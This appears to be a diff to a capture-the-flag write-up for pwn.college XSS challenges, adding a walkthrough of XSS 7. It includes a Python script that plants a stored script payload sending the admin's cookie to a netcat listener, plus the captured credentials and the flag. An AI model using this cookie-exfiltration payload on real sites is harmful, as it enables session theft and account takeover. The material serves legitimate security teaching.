@@ -2509,6 +2509,7 @@ Welcome to pwnpost, now with users!<hr>
 
 ## XSS 6
 
+### Source code
 ```py title="challenge/server" showLineNumbers
 #!/opt/pwn.college/python
 
@@ -2811,7 +2812,7 @@ Welcome to pwnpost, now with users!<hr>
 ## XSS 7
 
 ### Source code
-```py title="/challenge/server" showlineNumbers
+```py title="/challenge/server" showLineNumbers
 #!/opt/pwn.college/python
 
 import flask
@@ -2941,7 +2942,7 @@ app.config["SERVER_NAME"] = f"challenge.localhost:80"
 app.run("challenge.localhost", 80)
 ```
 
-```py title="/challenge/victim"
+```py title="/challenge/victim" showLineNumbers
 #!/opt/pwn.college/python
 
 import psutil
@@ -2989,7 +2990,10 @@ print("Visited! Go check if the attack worked!")
 
 ### Cookie exfiltration via XSS
 
-```
+This time, we have to exfiltrate the `auth` cookie for `admin` which is in the format `username|password`.
+Using these creds, we can log in as `admin` and view the flag.
+
+```py title="~/exploit.py" showLineNumbers
 import requests
 
 login_url = "http://challenge.localhost:80/login"
@@ -3002,9 +3006,9 @@ login_data = {
     "password": "1337"
 }
 
-# XSS payload
+# XSS payload to exfiltrate cookie
 payload_draft = {
-    "content": '<script>fetch("127.0.0.1:9999", {method: "GET", credentials: "include"});</script>'
+    "content": '<script>fetch("http://localhost:9999/?cookie=" + encodeURIComponent(document.cookie));</script>'
 }
 
 with requests.Session() as session:
@@ -3024,4 +3028,127 @@ with requests.Session() as session:
     publish_response = session.post(publish_url)
     print("[+] Publish response:")
     print(publish_response.text)
+```
+
+```
+hacker@web-security~xss-7:/$ python ~/script.py 
+[+] Login response:
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr></body></html>
+
+
+[+] Draft response:
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><b>YOUR DRAFT POST:</b> <script>fetch("http://localhost:9999/?cookie=" + encodeURIComponent(document.cookie));</script><hr>
+</body></html>
+
+
+[+] Publish response:
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("http://localhost:9999/?cookie=" + encodeURIComponent(document.cookie));</script><hr>
+</body></html>
+```
+
+Now that our payload is delivered, let's setup a listener.
+
+```
+hacker@web-security~xss-7:/$ nc -nvlp 9999
+Listening on 0.0.0.0 9999
+```
+
+Now, let's simulate the victim.
+
+```
+hacker@web-security~xss-7:/$ /challenge/victim
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
+Visiting http://challenge.localhost:80/
+Visited! Go check if the attack worked!
+```
+
+Looking at out listener, we can see that we have the `auth` cookie.
+
+```
+hacker@web-security~xss-7:/$ nc -nvlp 9999
+Listening on 0.0.0.0 9999
+Connection received on 127.0.0.1 37682
+GET /?cookie=auth%3Dadmin%7CJv.dJDO1YDL4ITM0EzW%7D HTTP/1.1
+Host: localhost:9999
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Referer: http://challenge.localhost/
+Origin: http://challenge.localhost
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+Priority: u=4
+```
+
+Let's log in using these credentials.
+
+```py title="~/script.py" showLineNumbers
+import requests
+
+login_url = "http://challenge.localhost:80/login"
+
+# Login credentials
+login_data = {
+    "username": "admin",
+    "password": "Jv.dJDO1YDL4ITM0EzW}"
+}
+
+with requests.Session() as session:
+    # Step 1: Log in
+    login_response = session.post(login_url, data = login_data)
+    print("[+] Login response:")
+    print(login_response.text)
+```
+
+```
+hacker@web-security~xss-7:/$ python ~/script.py 
+[+] Login response:
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2><b>YOUR DRAFT POST:</b> pwn.college{AzeMT4xBcTDZsDMZpjzaKnLHWJv.dJDO1YDL4ITM0EzW}<hr>
+<h2>Author: hacker</h2><script>fetch("http://localhost:9999/?cookie=" + encodeURIComponent(document.cookie));</script><hr>
+</body></html>
 ```
